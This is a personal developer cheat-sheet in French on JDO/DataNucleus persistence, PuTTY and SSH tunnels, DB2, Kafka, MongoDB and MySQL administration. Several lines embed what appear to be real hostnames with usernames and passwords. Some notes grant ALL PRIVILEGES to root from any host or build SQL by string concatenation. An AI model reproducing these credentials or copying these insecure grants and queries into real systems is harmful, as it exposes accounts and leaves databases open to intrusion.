    si j'ai l'erreur :javax.jdo.JDOFatalUserException: There is no available StoreManager of type "jdbc". Make sure that you have put the relevant DataNucleus store plugin in your CLASSPATH and if defining a connection via JNDI or DataSource you also need to provide persistence property "datanucleus.storeManagerType"
                    c'est parce que dans datanucleus.properties j'ai un mapping url=jdbc quelquechose et pour ca il a besoin du plugin rdbms qui se trouve dans une jar que je dois mettre dans mon classpath
    si j'ai l'erreur  Class persistance.UserNucleus has MetaData yet the class cant be found : 
                   c'est peut etre parce que <package name=" dans mon fichier jdo ne contient pas le chemin complet vers ma classe (mettre tous les packages depuis la racine)        
	pour enhancer les classes:   (is not persistable.) utiliser log4j c'est important pour comprendre ce qui se passe ne cas d'erreur
        on peut le faire aussi avec ant: voir ci dessous:
          	   java -cp D:\workspaceGanymede\YoaniWeb\WebContent\WEB-INF\classes\com\application\yoani\server\servlet\persistance\*.class;D:\workspaceGanymede\YoaniWeb\WebContent\WEB-INF\lib\log4j-1.2.8.jar;D:\workspaceGanymede\YoaniWeb\WebContent\WEB-INF\lib\datanucleus-api-jdo-3.0.0-m2.jar;D:\workspaceGanymede\YoaniWeb\WebContent\WEB-INF\lib\asm-all-3.3.1.jar;D:\workspaceGanymede\YoaniWeb\WebContent\WEB-INF\lib\datanucleus-enhancer-3.0.0-m2.jar;D:\workspaceGanymede\YoaniWeb\WebContent\WEB-INF\lib\datanucleus-core-3.0.0-m2.jar;D:\workspaceGanymede\YoaniWeb\WebContent\WEB-INF\lib\jdo-api-3.0.jar -Dlog4j.configuration=file:D:\workspaceGanymede\YoaniWeb\WebContent\WEB-INF\classes\log4j.properties org.datanucleus.enhancer.DataNucleusEnhancer -api JDO -v D:\workspaceGanymede\YoaniWeb\WebContent\WEB-INF\classes\com\application\yoani\server\servlet\persistance\persistance.jdo
               ou
               java -cp D:\workspaceRAD7\ecl_Enterprise\bin;D:\workspaceRAD7\ecl_Lib\lib\log4j-1.2.12.jar;D:\workspaceRAD7\ecl_Lib\lib\asm-3.2.jar;D:\workspaceRAD7\ecl_Lib\lib\datanucleus-enhancer-2.0.0-release.jar;D:\workspaceRAD7\ecl_Lib\lib\datanucleus-core-2.0.0-release.jar;D:\workspaceRAD7\ecl_Lib\lib\jdo2-api-2.3-eb.jar -Dlog4j.configuration=file:D:\workspaceRAD7\eclWeb\WebContent\WEB-INF\classes\log4j.properties org.datanucleus.enhancer.DataNucleusEnhancer -v D:\workspaceRAD7\ecl_Enterprise\src\java\ecl\entity\package.jdo
                ou
              "%JAVA_HOME%\bin\java" -cp D:\workspaceRAD7\ecl_Enterprise\bin;D:\workspaceRAD7\ecl_Lib\lib\log4j-1.2.12.jar;D:\workspaceRAD7\ecl_Lib\lib\asm-3.2.jar;D:\workspaceRAD7\ecl_Lib\lib\datanucleus-enhancer-2.0.0-release.jar;D:\workspaceRAD7\ecl_Lib\lib\datanucleus-core-2.0.0-release.jar;D:\workspaceRAD7\ecl_Lib\lib\jdo2-api-2.3-eb.jar -Dlog4j.configuration=file:D:\workspaceRAD7\eclWeb\WebContent\WEB-INF\classes\log4j.properties org.datanucleus.enhancer.DataNucleusEnhancer -v D:\workspaceRAD7\ecl_Enterprise\src\java\ecl\entity\package.jdo
              ou 
              java -cp D:\workspaceGanymede\YoaniWeb\WebContent\WEB-INF\lib\asm-3.2.jar;D:\workspaceGanymede\YoaniWeb\WebContent\WEB-INF\lib\datanucleus-enhancer-3.0.0-m2.jar;D:\workspaceGanymede\YoaniWeb\WebContent\WEB-INF\lib\datanucleus-core-3.0.0-m2.jar;D:\workspaceGanymede\YoaniWeb\WebContent\WEB-INF\lib\jdo-api-3.0.jar org.datanucleus.enhancer.DataNucleusEnhancer -v D:\workspaceGanymede\YoaniWeb\src\com\application\yoani\server\servlet\persistance\persistance.jdo
          avec ant:
    AVEC ANT EFFACE EXPRES
    si lors de l'enhancement j'ai l'erreur bad major version...offset=6:
            modifier mes parametres du run du ant et choisir une autre jre (6.1)                  	   
  appel a une methode JDO : 
      classe Applicative: 
          service.init();
        	return service.select();  ou create etc...
      classe DAO qui utilise jdo:
      
      
            public  void maMethodeUpdateOuSelect() throws Exception
      	    {
      	                       PersistenceManager pm = PersistanceManagerFactorySingleton.getInstance().getpmf().getPersistenceManager(); // on fait ca si j'ai fait un singleton (voir plus haut)
      	           ou    (mais non recommande: faire plutot un singleton comme ci-dessus)
                          	     PersistenceManagerFactory pmf = JDOHelper.getPersistenceManagerFactory("datanucleus.properties"); // datanucleus.properties se trouve a la racine du java (du classpath quoi) // on fait ca si j'ai pas de singleton... pas bien.
                   	            PersistenceManager pm = pmf.getPersistenceManager();
                  puis
    	           Transaction tx=pm.currentTransaction();
    	        }
    	         try
    	        {
    	            tx.begin();
    	            // seectionner
          	            long id = 24389;
          	            WEC53_D_CMPDMD e = (WEC53_D_CMPDMD) pm.getObjectById(WEC53_D_CMPDMD.class, id);
          	            ou 
           	                        CarNucleus e = pm.getObjectById(CarNucleus.class, new CarNucleus(Integer.parseInt(carid), null,null,null,null,null,null,null));
                      	            WEC53_D_CMPDMD resCopy= pm.detachCopy(e); // important : mon objet doit etre detacheable.. voir plus bas
          	            pour recuperer une liste d'objets : requete
          	                   pour recuperer les fils child enfants d'une classe: populate jointure joins
          	                           exemple: MaClasseParente
          	                                     |_maOuMesClassesFille1
          	                                     |    |_maOuMesClasseFille2
          	                                     |_autreClasseFille    
                                        // d'abord definir tous les FetchGroup:(un par classe parente)          	                                     
          	                            FetchGroup grpMaClasseParente = pm.getFetchGroup(MaClasseParente.class, "JinventeUnNomDeGroupeDeChampsNonPrimitifARecupererAussi");
          	                            FetchGroup grpMaouMesClassesFille1 = pm.getFetchGroup(MaOuMesClassesFille1.class, "jinventeUnNomPourCeGroupe");
                                  			grpMaClasseParente.addMember("maOuMesClassesFille1(monChampJavaNonPrimitif1DeMaClasseParente)").addMember("autreClasseFille(nomDuChampJava)");
                                        grpMaouMesClassesFille1.addMember("maOuMesClasseFille2");
                                        PUIS ENFIN ONENGLOBE TOUT CA:
                                  			pm.getFetchPlan().addGroup("JinventeUnNomDeGroupeDeChampsNonPrimitifARecupererAussi").addGroup("jinventeUnNomPourCeGroupe");
                                  			pm.getFetchPlan().setMaxFetchDepth(2); // je defini la profondeur: 2 il va parcourir 2 enfants donc la il va recuperer MaClasseParente.monChampJavaNonPrimitif1.sesFils si je mets -1 c'est infini
                                  			pm.getFetchPlan().setFetchSize(FetchPlan.FETCH_SIZE_GREEDY); // FetchPlan.FETCH_SIZE_OPTIMAL ou un chiffre pour recuperer un nombre limite de lignes de fils 
                                  ensuite je peux faire ma requete :                                  			
                    	            Query query = pm.newQuery(WEC51_M_TEMPLATE.class);
                    	             query.setOrdering("this.age ascending"); ou query.setOrdering(WEC52_M_CHAMPS.ORDRE+" ascending"); // pour faire un order by orderby
                    	            ou
                    	            Query query = pm.newQuery(WEC51_M_TEMPLATE.class, NomDuChampJavaClasseFilleJointe.NomDuChampJavaDeLaClasseFille+"=="+id); ou "toto=titi"); ou "this.age >= 18"
                                  Collection<WEC51_M_TEMPLATE> allProducts = (Collection<WEC51_M_TEMPLATE>)query.execute();
                                  resCopy= pm.detachCopyAll(allProducts);     // important : mon objet doit etre detacheable.. voir plus bas
                                  ou 
                                  return (WEC55_D_VALCHM[]) pm.detachCopyAll(result).toArray(new WEC55_D_VALCHM[0]);
                                  ou si j'ai plusieurs conditions:
                                                  Query query = pm.newQuery(Person.class); 
                                                  query.declareParameters("int age1, int age2, String lng");
                                                  query.setFilter(WEC52_M_CHAMPS.IDTEMPLATE+"== age1 && "+WEC52_M_CHAMPS.ID+" == age2");
                                                  ou
                                                  query.setFilter("this.age >= age1 && this.age == age2");
                                                  Puis
                                                  Map args = new HashMap();
                                                  args.put("age1", new Integer(20));
                                                  args.put("age2", "mavaleur");
                                                  Collection result = (Collection)query.executeWithMap(args);
                                                  field = (WEC52_M_CHAMPS)result.toArray()[0];
                                                  et detacher l'objet pour une utilisation exterieure
                                  ou si je veux faire du sql: 
                                                         Query query = pm.newQuery("javax.jdo.query.SQL", "select * from wec52_m_champs where wec52_idtemplate = " + id + "order by wec52_ordre");
                                                          query.setClass(WEC52_M_CHAMPS.class);
                                                          // 3. perform query
                                                          Collection<WEC52_M_CHAMPS> fieldsOfTemplate = (Collection<WEC52_M_CHAMPS>)query.execute();
                                                          et detacher les objets pour une utilisation exterieure
                                                          ou si c'est un count : 
                                                                  Query query = pm.newQuery("javax.jdo.query.SQL", "select max(wec52_id) from wec52_m_champs where wec52_idtemplate = " + f.getWEC52_IDTEMPLATE());
                                                                  query.setUnique(true);
		                                                              int maxId = Integer.parseInt(query.execute().toString());
                                pour recuperer qu'un seul element: 
                                      (...)
                                        query2.setUnique(true);
                                        MonObjet toto = (MonObjet)query.execute();
                                
                  // creer save sauver updated update 
          	            CarNucleus book = new CarNucleus("String car_model", 2, new Date(), 3, "String color", "String engine", "String description");
      	                 book = pm.makePersistent(book);
      	                retbook= pm.detachCopy(book);    // on detache l'objet pour une utilisation ulterieure apres fermeture de la transaction. attention: l'objet doit etre declare detacheable
      	        // pour sauver une inserer ou updater une liste complette: 
      	               pm.makePersistentAll(list);
              // pour supprimer delete: 
      	               pm.deletePersistentAll(list); ou pm.deletePersistant(f);      	               
            // puis a la fin:      	               
                          tx.commit();
                      }
                      catch (Exception e)
                      {
                          logger.error(e,e);
                          tx.rollback(); // si besoin
                          throw new IllegalArgumentException(e);
                      }
                      finally
                      {
                          if (tx.isActive())
                          {
                              tx.rollback();
                          }
                          if (!pm.isClosed()) pm.close();
                      }
                    	return null; ou whatever: return list.toArray(new WEC51_M_TEMPLATE[0]);// mais pas besoin de renvoyer quelquechose si c'est une EditorGrid car ses objets sont dejà affiches
                  }    	
      Si j'ai l'erreur javax.jdo.JDOFatalUserException: Class org.datanucleus.jdo.JDOPersistenceManagerFactory was not found. : 
              modofier la classe du  PersistenceManagerFactoryClass dans le fichier datanucleus.properties  

    datanucleus.properties    // situe dans la base du repertoire java (class)
            javax.jdo.PersistenceManagerFactoryClass=org.datanucleus.api.jdo.JDOPersistenceManagerFactory
            javax.jdo.PersistenceManagerFactoryClass=org.datanucleus.jdo.JDOPersistenceManagerFactory
            javax.jdo.option.ConnectionDriverName=oracle.jdbc.OracleDriver
            javax.jdo.option.ConnectionURL=jdbc:oracle:thin:@(DESCRIPTION=(ADDRESS=(COMMUNITY=TCPIP.world)(PROTOCOL=TCP)(Host=hpsd1805.mc2.renault.fr)(Port=1526))(CONNECT_DATA=(service_name=sajdevo01)))
            javax.jdo.option.ConnectionUserName=saj_adm
            javax.jdo.option.ConnectionPassword=saj_adm_01
            javax.jdo.option.Mapping=hsql
            datanucleus.metadata.validate=false
            datanucleus.autoCreateSchema=true // attention! il cree les colonnes si elles n'existent pas (le ouf!)
            datanucleus.validateTables=false
            datanucleus.validateConstraints=false
          
          Exemple de classe jdo a mettre cote share // important: mettre les getters et setters et les utiliser sinon le passage detached-clean->detached-dirty ne se fait pas si on modif un champ
                                        
                              package com.kanail.shared.jdo;
                              import java.io.Serializable;
                              
                              @PersistenceCapable(identityType=IdentityType.APPLICATION, detachable="true")
                              @Cacheable("true")
                              public class VPA01_STUDENT extends Entity 
                              {
                              	private static final long serialVersionUID = 1L; // LINKldsgserialsdflkjegml c'est important car classe serialise----->transferee-->recuperee--->deserialisee et CASTEE avec une même classe qui doit avoir le même id de serialisation. Sinon InvalidClassException : quand on change une classe ca change automatiquement son serialVersionUID. or si j'ai serializé une version precedente de cette classe et que je veux la deserialiser alors ce sera KO si je n'ai pas mis ça. Apres si les deux serialVersionUID sont = mais que la deserialisation se passe mal j'aurais une autre erreur plus précise plus loin. 
                              		public VPA01_STUDENT() 
                              		{
                              		idFieldName="VPA01_ID";
                              		}
                              		@PrimaryKey
                              		@Persistent(valueStrategy=IdGeneratorStrategy.INCREMENT)
                              		public long VPA01_ID;
                              		@Column(jdbcType="VARCHAR", length=30)
                              		public String VPA01_NOM = null;
                              		@Column(jdbcType="VARCHAR", length=30)
                              		public String VPA01_PRENOM = null;
                              		@Column(jdbcType="VARCHAR", length=30)
                              		public String VPA01_ETABLISSEMENT = null;
                              		@Column(jdbcType="VARCHAR", length=30)
                              		public String VPA01_CLASSE = null;
                              		@Column(jdbcType="VARCHAR", length=30)
                              		public String VPA01_EMAIL = null;
                              		@Column(jdbcType="VARCHAR", length=30)
                              		public String VPA01_PASSWORD = null;
                              		@Column(jdbcType="VARCHAR", length=30)
                              		public String VPA01_PROFILE = null;
                              	    @Persistent(mappedBy="students") // nom de l'objet java
                              	    public ArrayList<VPA02_MATIERE> matieres;
                              	    
                              	    @Persistent(mappedBy="students") // nom de l'objet java
                              	    public VPA03_GROUPE groupe;
                              	      public enum ProfileEnum implements Serializable, IsSerializable 
                                        {
                                         	eleve(0,"ELEVE"),admin(1,"ADMIN");
                                         	public int typeId;
                                        	public String label;
                              
                                    	private ProfileEnum(int typeId, String labelId){
                                    		this.typeId = typeId;
                                    		this.label = labelId;
                                    	}	
                                    	}
                                  
                              }

          
          
            exemple de classe nucleus (compatible aussi avec les grid gxt) (dans gxt je la place cote client)
                  se referrer à "Exemple de classe jdo a mettre cote share"
                                 
          OLD Ma classe nucleus situe dans un package (dans ce meme package a la racine il doit y avoir package.jdo)            
            package com.renault.wec.client.jdo (avec gxt gwt je le mets dans la partie cliente);
                                      import java.io.Serializable;
                                      import javax.jdo.annotations.IdentityType;
                                      import javax.jdo.annotations.PersistenceCapable;
                                      import javax.jdo.annotations.PrimaryKey;
                                      
                                      @PersistenceCapable(identityType=IdentityType.APPLICATION)
                                      @Cacheable("false") // mettre ca si on en veut pas cacher les resultats... (par defaut c'est a true)
                                      public class WEC53_D_CMPDMD implements Serializable {
                                      	@PrimaryKey
                                      	long WEC53_ID;
                                      	String WEC53_IDDMD = null;
                                          String WEC53_IDTEMPLATE = null;	
                                          public WEC53_D_CMPDMD()
                                          {
                                          }
                                          public long getWEC53_ID() {
                                      		return WEC53_ID;
                                      	}
                                      	public void setWEC53_ID(long wEC53_ID) {
                                      		WEC53_ID = wEC53_ID;
                                      	}
                                      	public String getWEC53_IDDMD() {
                                      		return WEC53_IDDMD;
                                      	}
                                      	public void setWEC53_IDDMD(String wEC53_IDDMD) {
                                      		WEC53_IDDMD = wEC53_IDDMD;
                                      	}
                                      	public String getWEC53_IDTEMPLATE() {
                                      		return WEC53_IDTEMPLATE;
                                      	}
                                      	public void setWEC53_IDTEMPLATE(String wEC53_IDTEMPLATE) {
                                      		WEC53_IDTEMPLATE = wEC53_IDTEMPLATE;
                                      	}
                                          public WEC53_D_CMPDMD(String name, String desc)
                                          {
                                              this.WEC53_IDDMD = name;
                                              this.WEC53_IDTEMPLATE = desc;
                                          }
                                          public WEC53_D_CMPDMD(long id)
                                          {
                                              this.WEC53_ID = id;
                                          }
                                      }
        OLD package.jdo: (nest plus necessaire avec les annotations)
          <?xml version="1.0"?>
          <!DOCTYPE jdo PUBLIC
              "-//Sun Microsystems, Inc.//DTD Java Data Objects Metadata 2.0//EN" "http://java.sun.com/dtd/jdo_2_0.dtd">
          <jdo>
          <package name="ecl.entity">
              <class name="CarNucleus" identity-type="application" table="FWS_CAR">
                <field name="carid" primary-key="true" value-strategy="native">
                      <column name="CAR_ID" jdbc-type="INTEGER"/> types possibles : Valid JDBC Type (CHAR, VARCHAR, LONGVARCHAR, NUMERIC, DECIMAL, BIT, TINYINT, SMALLINT, INTEGER, BIGINT, REAL, FLOAT, DOUBLE, BINARY, VARBINARY, LONGVARBINARY, DATE, TIME, TIMESTAMP, BLOB, BOOLEAN, CLOB, DATALINK) 
                 </field>
                 <field name="car_model">
                          <column name="CAR_MODEL" length="80" jdbc-type="VARCHAR ou DATE ou INTEGER..."/>
                 </field>
                <field name="...
          </class>
          </package>
          </jdo>    
        
              

mobaxterm : (si j'arrive pas a faire du sftp parce que la connexion se coupe, ca a marche avec winscp)
  pour enregistrer des macros : 
    repetitifs repertitive automatiser les saisies : menu macros> record new macro
  on peut ouvrir en multi fenetre (menu view)
  installer des packages : cliquer sur icone packages dans le menu. (il va peut etre demander d'abord de setter des variables home et root). J'ai installé mksh    

putty : (mobaxterm mieux que putty)
pour rapidement se connecter avec un racourci: 
faire un racourci et dans cible mettre : D:\Installations\putty.exe wecapp@vm713aos.mc2.renault.fr -pw w1e2c3 
pour avoir de belles couleurs quand on se connecte: parametrer sur la machine unix distante ceci:
menu change settings > window>colours
    Avant:
          cd
          vi .vimrc
          tapper syn on
          sauver et quitter.
pour modifier rapidos les couleurs des polices de plusieurs sessions sauvegardee: 
      il faut le faire avec regedit:
        HKEY_CURRENT_USER\Software\SimonTatham\PuTTY
        modifier color14 (c'est le bleu fonce il est trop fonce) 
  pour se connecter à un service en passant par un tunnel ssh:
      mamachine----->PROXYm'empeched'accederauservice---->service
      mamachine----->proxymempechedaccederauservicemaispasAUnAutreServeurQUiAunPortSSHouvert--->AutreMachineServeurAvecSSHQuiDoitAccepterLesTunnels----tunnel------------------------>Service
                                                                                                c comme si j'etais ici puis je vais -------------------------------------------------->là
                                                                                conf Putty: menu>Session>ServeurSSH;                        menu>tunnel>"L"PortSUrMaMachineDisponible "Destination:PortDuService"
      je demarre la connexion putty vers le serveur ssh puis je vais vers le service via localhost:PortSUrMaMachineDisponible

XML :     interpretation des caractères xml html
remplacer les & (et commercial) par &amp;
Caractère  	Code d'echappement
Perluète 	& 	&amp;
Apostrophe 	' 	&apos;
Guillemets droits 	" 	&quot;
Superieur à 	> 	&gt;
Inferieur à 	< 	&lt;


MCD/MPD :
      forte faible
    esclav    maitre  
     jai n   j'ai un
      X,n -> 0,1
      0,1 -> 1,1
      1,1 <-> 1,1 faire une seule table
        exequo
      X,n-><-X,n
      
  bonne pratique gestion des rôles droits etc...
      voici les tables a creer:  USER    GROUPE        USER-GROUPE      USER PERMISSION   GROUPE PERMISSION     PERMISSION  


DB2 :
pour se connecter à db2: 
							connect to IS user AW0EPRI using r9097268
Exemple de requete qui marche très bien avec des switch case else imbriques. On peut imbriquer selon ce model à l'infini...:
				select CHAR(
				CASE WHEN PROJET_LB = 'A' THEN 
				(
					CASE WHEN PRIORITE_LB='A' THEN 'B' 
					ELSE 'B' END 
				)
				ELSE
				(
					CASE WHEN PRIORITE_LB='A' THEN 'B' 
					ELSE 'B' END 
				) END
				) FROM W0DCI$.FINVA FETCH FIRST 10 ROWS ONLY

  autre exemple : 				
		  select * FROM W0DCI$.FINVA FETCH FIRST 10 ROWS ONLY
si j'ai l'erreur java.lang.UnsatisfiedLinkError:
		 db2jdbc (Not found in java.library.path) c'est parce que un jar recherche des dll et ne les trouve pas.
			Les dll de SQLIB/bin
			Il faut que la propriete système java.library.path de l'AS qui doit être modifiee avec le path /logiciel/db2/sqllib/bin. 
			A rajouter deux variables d'environnement sur l'AS et dans une note de livraison :
			# DB2INSTANCE  = db2
			# LD_LIBRARY_PATH  = /logiciel/db2/sqllib/lib
			ou en local, de definir une variable websphere DB2_JDBC_DRIVER_PATH (pas sur du nom) qui pointe vers D:/workspaceRAD7/dwiWeb/WebContent/WEB-INF/lib 
this will show you all of the tables:
			list tables for all
	Another more technical way that will only show you the tables you have access to: 
			select name, creator from sysibm.systables order by name
	pour faire un select des premieres lignes seulement (rownum limit)
			SELECT VINVA.NATURE FROM VINVA FETCH FIRST 7 ROWS ONLY
			SELECT W0DCI$.FINVA.NATURE FROM W0DCI$.FINVA FETCH FIRST 7 ROWS ONLY

kafka : A_COMPLETER voir aussi https://github.com/akka/alpakka-kafka qui fait de reactive streaming c a d backpressure c a d si consummer sont debordes par vitesse ils disent au producer de ralentire. voir aussi du code source sur github/jamesward/koober(demo de la voiture et du gars sur le map) 
        producer1-   kafka
                  --\---->topic1(copié sur partition1, partition2, partition3)  // 1 partition leader et les autres partitions sont juste des replicats de securité pour eviter perte données
        producer2  --\--->topic2                "    partition1(0,1,2,3,4...)          -->consummer1
                  ------->topic3                "                                      -->consummerGroup(consummer2,consummer3)
        producer3/------->topic4                "
        logComppaction sert à convertir automatiquement les doublons-triplons... en un seul: gain de place dans le disque
        producers ont 3modes d'ecrtutre (async: donees pas garanties reçues. commited to leader: confirmation reception par le partition leader. commited to leader & quorum: confirmation reception par leader + une autre partition)
mongodb : nosql : (il vaut mieux stocker les fichiers images documents dans le systeme de fichier que en blob dans la db. la db c'est pour les metadatas.)
        -toujours activer l'authentification (par user/password au moins) facultatif sur local pour test.
        -il faut désactiver l'introspection javascript par sécurité(dans fichier de config mettre javascriptEnabled:false). LinkLKJDSFA
        -attention!!!! l'ordre des champs du json au niveau n-1 est important! au niveau n pas de probleme( par ex utiliser ordre alphabetique)
        -si je veux utiliser limit alors toujours utiliser sort avant limit dans une requete.
        -il faut faire un schema: installer https://studio3t.com/knowledge-base-articles/schema-explorer/
                        resumé de ce que j'ai lu là :https://www.mongodb.com/blog/post/6-rules-of-thumb-for-mongodb-schema-design-part-1
                        si j'ai relation 1-N(peu nombreux): Où je n'aurais jamais besoin de recuperer ces N tout seuls sans leur parents
                                    alors je peux faire 
                                                  {
                                                    name: 'Kate Monster',
                                                    ssn: '123-456-7890',
                                                    addresses : [
                                                       { street: '123 Sesame St', city: 'Anytown', cc: 'USA' }, // j'en ai peu.
                                                       { street: '123 Avenue Q', city: 'New York', cc: 'USA' }
                                                    ]
                                                  }
                        si j'ai relation 
                                1-N(une centaine) et que c'est l'application qui gère la recuperation des N pour l'element 1 . mais en fait ca a l'avantage d'etre aussi une relation N-N
                                    alors je peux faire (un produit contient plusieurs pieces)
                                    produit:{
                                        name : 'MON PRODUIT 1',
                                        pieces : [     // array of references to Part documents
                                            ObjectID('AAAA'),    // reference vers la piece ci dessous
                                            ObjectID('F17C'),    // reference to a different Part
                                            ObjectID('D2AA'),
                                            // etc
                                        ]
                                        }
                                    piece:{
                                            _id : ObjectID('AAAA'),
                                            partno : '123-aff-456',
                                            name : '#4 grommet',
                                            qty: 94,
                                            cost: 0.94,
                                            price: 3.99
                                        }                 
                            si j'ai une relation 1-N où N c'est PLEIN denregistrements. Produit peut avoir plusieurs pieces mais une piece ne peut avoir qu'un seul produit.
                                    produit:{
                                        name : 'MON PRODUIT 1',
                                        _id : ObjectID('AAAA')
                                        }
                                    piece:{
                                            partno : '123-aff-456',
                                            name : '#4 grommet',
                                            qty: 94,
                                            cost: 0.94,
                                            price: 3.99
                                            produit: ObjectID('AAAA') // comme dans une base relationelle 1-N
                                        }                               
        -il faut desactiver la casesensitive et accent sensitive pour les requetes
        -l'ordre dans les requetes est important : d'abord filtrer puis trier puis joindre
        -il faut enable journaling pour recuperer la base old version si devient inconsistent (configuration-> storage.journal.enabled)
        -requetes ordonnees sortees toujours sur un ou des champs indexés. (sinon sur un-des champs non indexes risques d'overflow donc d'erreur: retourne rien)
        -des arrays pas trop longues et indexees(ca l'est pas défaut)
        pour tester online en ligne des requetes : https://docs.mongodb.com/manual/tutorial/query-arrays/ 
        pour installer mongodb en local: 
            https://docs.mongodb.com/manual/tutorial/install-mongodb-on-windows/
            dezipper quelque part, mkdir c:/data/db(ou autre part...)
        pour démarrer mongodb serveur en local : 
            puis cmd ceci: 
            pathVersLeBin/mongod.exe --dbpath="c:\mongodb-win32-x86_64-2008plus-ssl-4.0.9\data\db" // ca demare le serveur par defaut là : mongodb://127.0.0.1:27017/?gssapiServiceName=mongodb
        pour demarrer un client mongodb pour administrer la base et pour faire des requetes de test
            ensuite executer mongo.exe : c'est un client pour faire les requetes (c'est du javascript la dedans) LinkLKJDSFA . On peut aussi utiliser un gui qui s'appelle Robo3T à installer.
            ou bien mongo mongodb://mongodb0.example.com:28015/testdb?ssl=true // si il est distant
        exemples de requetes. Une collection = une table relationelle
            var doc = db.uneCollection.findOne({ _id: 1 })// trouver par id (du coup doc est une variable) 
            db.uneCollection.remove({ _id: 1 })  
            db.uneCollection.insert({ _id: 1, jsFunc: function(){ print("hello") } } ) // si uneCollection n'existe pas elle est automatiquement créee
            db.myNewCollection3.createIndex( { y: 1 } ) // ajoute un indexe dans la collection
MYSQL :
   apres installation: 
        demarrer le serveur mysql:
          cd C:\Program Files\MySQL\MySQL Server 5.6\bin\
          C:\Program Files\MySQL\MySQL Server 5.6\bin\mysqld --console
         ATTENTION! toujours d'abord arreter apache puis redemarrer mysql puis redemarrer apache LINKmysql9938
                ce qui donne
                /etc/init.d/apache2 stop      MAIS Plutot faire sur ubuntu simplement "start et stop mysql" sous /etc/init.d
                invoke-rc.d mysql stop    (/etc/init.d)
                  (facultatif: pour voir l'etat du serveur mysql: sudo systemctl status mysql)
                invoke-rc.d mysql start
                /etc/init.d/apache2 start 
                
surwindows:
          cd C:\Program Files\MySQL\MySQL Server 5.6\bin\
          mysqld.exe --initialize si besoin pour la première fois apres installation. cree  le repertoire data.
          ou mysqld.exe --initialize --user=mysql puis
          C:\Program Files\MySQL\MySQL Server 5.6\bin\mysqld --console --skip-grant-table(pour que je puisse me connecter en root sans mot de passe) (demarre le serveur mysql)
                apres je pourrais refaire sans le --skip-grant-table quand j'aurais defini un mot de passe a mon user(ci dessous)
        se connecter :
            C:\Program Files\MySQL\MySQL Server 5.6\bin\mysql -uroot -p
            use mysql // change de base de database; UPDATE user SET Password=PASSWORD('my_password') where USER='root'; (deprecie depuis v5.7.6)
                                          ou 
                                          UPDATE user SET authentication_string=PASSWORD('my_password') where USER='root';  (deprecie depuis v5.7.6)
                                          ou
                                          SET PASSWORD FOR nomuser = 'nouveaupassword';
                                          ou 
                                          alter user 'root'@'localhost' identified by 'nouveau password';
    sur unix: 
    cd /var/run/
    /var/run/mysql -uroot -p
    mysql -u root --password=foulurecalotte 
      mysql -h vma30ads.mc2.renault.fr -P 3316 -u ple_adm  --password=ple_adm_01 --default-character-set=utf8
      mysql -h localhost -P 3306 -u root  --password=foulurecalotte --default-character-set=utf8
      puis 
      USE `ple_db_01`;
afficher la liste des bases : 
  show databases; 
    Connaitre la version
        mysql -V
    champ heure : champ TIME:
        where monchamptime<TIME('09:00:00')
    taille d'un string : 
        LENGTH(str)
    renvoyer en minuscule 
        LOWEER()
    concatner valeurs d'une seule ligne 
      CONCAT(champ,'bla',bli',champ,'blo')
se connecter :
    C:\Program Files\MySQL\MySQL Server 5.6\bin\mysql -uroot -p
    mysql -u root --password=foulurecalotte 
    sur unix 
    cd /var/run/
    /var/run/mysql -uroot -p
      mysql -h vma30ads.mc2.renault.fr -P 3316 -u ple_adm  --password=ple_adm_01 --default-character-set=utf8
      mysql -h localhost -P 3306 -u root  --password=foulurecalotte --default-character-set=utf8
      puis 
      USE `ple_db_01`;
afficher la liste des bases : 
  show databases;
si il fait une erreur de group by a cause du sql_mode mal defini : 
    SELECT @@sql_mode 
        il affiche 'ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION'
        faire
        set sql_mode='STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION'
pour voir quel est l'encodage de ma base de donnee : 
  SELECT @@character_set_database, @@collation_database;   
pour exporter la base de donnee via la console: 
  mysqldump -u YourUser -pUserPassword YourDatabaseName > wantedsqlfile.sql  
Si un programme java n'arrive pas à se connecter à mysql 
      peut etre que le parametre d'encodage envoye à javarun n'est pas bon
les donnees sont dans var/lib/mysql on peut le voir aussi en faisant select @@datadir;
la conf de mysql est sur /etc/mysql/mysql.cnf ou /etc/mysql/mysql.conf.d/mysqld.cnf // dedans il defini dans quelle repertoire est la base de donnee 
pour voir les users et leur droits :
      SHOW GRANTS
pour creer un user qui puisse se connecter à distance : (si j'ai l'erreur 1130) 
    CREATE USER 'yannick'@'%' IDENTIFIED BY 'mysql';
    GRANT ALL PRIVILEGES ON *.* TO 'yannick'@'%' WITH GRANT OPTION;
    GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION; // %: tous les ip peuvent se connecter connexion à distance (a faire si erreur 1045)
    GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'PourWenhua1234' WITH GRANT OPTION; // faire ca si erreur 1045 que connexion je n'arrive pas a me connecter depuis le reseau network
pour creer une base de donnee :
      CREATE DATABASE [IF NOT EXISTS] db_name
pour se connecter à une base de donnee:
      USE menagerie
pour connaitre le detail description d'une table: sa structure ses proprietes :
  desc nom_de_ma_table;      
insertion :
      INSERT INTO tatable ('date', 'pseudo', 'email') VALUES ('10-10-2010', 'sky', 'test@tets.fr')
ajouter une colonne 
ALTER TABLE VPA01_STUDENT ADD VPA01_PHOTO VARCHAR(20) CHARACTER SET latin1 COLLATE latin1_bin DEFAULT NULL AFTER VPA01_PRENOM;
ALTER TABLE VPA01_STUDENT MODIFY VPA01_PHOTO VARCHAR(20);

pour supprimer les retours chariot du resultat :
    select ... REPLACE(ps_product_lang.description_short, '\n','') descr ....
pour concatener plusieurs lignes en une seule : (equivalent de listagg sur oracle) : group_concat
        si il est trop limite en length alors faire : 
                  SET SESSION group_concat_max_len = 1000000; (ne s'applique que à la session actuelle)
        select group_concat(MyString separator ', ') as myList from table
        where id < 4
        exemple avec group by : 
        select group_concat(ps_attribute_lang.name separator ', '), ps_attribute.id_attribute, ps_product.id_product, ps_product.reference, ps_product_attribute.ean13 , ps_product_attribute.id_product_attribute
        from ps_product_attribute
        inner join ps_product on ps_product.id_product = ps_product_attribute.id_product
        inner join ps_product_attribute_combination on ps_product_attribute_combination.id_product_attribute=ps_product_attribute.id_product_attribute
        inner join ps_attribute on ps_attribute.id_attribute=ps_product_attribute_combination.id_attribute
